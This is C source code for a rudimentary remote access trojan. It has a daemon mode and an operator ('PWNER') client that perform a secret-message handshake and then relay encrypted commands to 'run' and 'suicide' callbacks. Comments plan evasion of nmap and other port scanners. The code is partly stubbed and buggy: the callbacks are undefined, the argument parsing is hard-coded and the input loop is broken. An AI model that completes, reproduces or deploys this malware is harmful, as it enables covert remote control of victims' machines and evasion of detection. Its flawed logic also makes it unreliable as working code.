#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <clog/clog.h> //logging library

#include <net_util.h> //networking library
#include <crypt.h>

#define SECRET_MSG "bla"
#define CONNECT_ACK "ack"
#define BUFFER_SIZE 256
#define MAIN "MAIN"
#define DAEMON "RAT_SERVER"
#define CLIENT "PWNER"

typedef const char* (*callback)(int, const char**);

int connect_rat(const char* hostname, int port)
{
    char* msg = (char*)malloc(1);
    int i = 0;
    char c = 'a';
    int soc = connect_server(hostname, port);
    clog_i(CLIENT, "Operating client in fd: %d", soc);
    if (soc == -1) {
        clog_e("MAIN", "Cannot connect to rat");
        close(soc);
        return -1;
    }
    clog_i(CLIENT, "Sending secret message");
    writeln(soc, SECRET_MSG, strlen(SECRET_MSG));
    if (strcmp(readln(soc), CONNECT_ACK) == 0) {
        clog_i(CLIENT, "Acknowledgement OK");
        while (1) {

  while(((c=getchar()) != '\n')||((c=getchar()) != '\r')/*||((c=getchar) != '\r\n') //irritating windows*/)
                  {
                    *msg=getchar();
                    msg=(char *)realloc(msg, i);
                    i++;
                  }
            clog_i(CLIENT, "Writing to server %s", msg);
            const char* encryptd_msg = encrypt(msg);
            writeln (soc, encryptd_msg, strlen (encryptd_msg));
            printf ("%s\n", decrypt (readln (soc)));
        }
    }
    return 0;
}

//no operation


//always returns a function
callback hash_function(const char* str)
{
    //stub
    //tech-debt
    //compute using hash, rather using strcmp
    if (strcmp(str, "suicide") == 0) {
        return suicide;
    }
    else if (strcmp (str, "run") == 0) {
        return run;
    }
    else {
      return no_op;
    }
}

const char **str_args_parse(int *count, const char* msg)
{
    //stub
    //args[0] = "*/*"; i.e. current working directory
    //TODO add logic to parse details
    *count = 2;
    const char **str = (const char **)malloc(sizeof(char *) * 2);
    str[0] = "pwd";
    str[1] = "valuable_information";
    return str;
}

void process(const char* msg, int soc)
{
  int count = 0;
    const char *decryptd_msg = decrypt(msg);
    callback cb = hash_function(decryptd_msg);
    clog_i(DAEMON, "Received message: %s", decryptd_msg);
    const char **args = str_args_parse(&count, decryptd_msg);
    const char* output = encrypt(cb(count, args));
    writeln(soc, output, strlen(output));
}
int start_rat(int port)
{
    int soc = start_server(port);
    //char* msg = (char*)malloc(BUFFER_SIZE);
    if (soc == -1) {
        //TODO add aggressive logic rather than giving up
        fprintf(stderr, "Cannot start rat\n");
        return -1; //start_rat(port); //TODO control stack overflow
    }
    clog_i(DAEMON, "Starting server...");
    /*while(1) */
    {
        clog_i(DAEMON, "Exchanging Secret Msg");
        //add logic to escape from nmap and other port scanners
        //add logic to change secret message
        if (strcmp(readln(soc), SECRET_MSG) == 0) {
            clog_i(DAEMON, "Sending ACK");
            writeln(soc, CONNECT_ACK, strlen(CONNECT_ACK));
        }
        //else
         //   return start_rat(port); //FIXME use seperate process or threads(controlled)
    }
    //write to client or if it fails run like hell
    while (1) {
        //process args and return output to server
        process(readln(soc), soc); //this writes to client
    }
    return 0;
}

int main(int argc, char* argv[])
{
    clog_enable();
    if (argc < 2) {
        fprintf(stderr, "Usage: rat [HOST] PORT\n");
        return -1;
    }
    else if (argc == 2) {
        clog_i(MAIN, "Starting RAT...");
        return start_rat(atoi(argv[1]));
    }
    else if (argc == 3) {
        clog_i(MAIN, "Connecting to RAT...");
        return connect_rat(argv[1], atoi(argv[2]));
    }
    else
        return -1;
}
